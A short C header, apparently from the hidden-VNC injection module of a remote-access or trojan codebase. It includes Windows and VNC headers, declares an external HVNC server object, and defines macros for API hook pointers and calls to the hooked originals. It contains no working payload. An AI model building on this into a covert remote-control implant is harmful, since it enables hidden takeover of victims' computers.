#ifndef INJEXE_H_INCLUDED
#define INJEXE_H_INCLUDED

#define _WIN32_WINNT 0x0501
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <ntdll.h>
#include <tmmintrin.h>
#include <vfw.h>
#include <syslib.h>
#include <rfb\rfb.h>

#include "..\defines.h"
#include "..\vnc\xvnc.h"

extern PHVNC lpServer;

#define DEF_HOOK(x) void *p##x;
#define REAL_API(x) __##x *lp##x=(__##x*)p##x;\
                    if (!lp##x)
#define EXTERN_HOOK(x) extern LPVOID p##x;

void InitVNCHooks(VNC_HOOKS*);
void InitCommonHooks(COMMON_HOOKS*);

#endif // INJEXE_H_INCLUDED
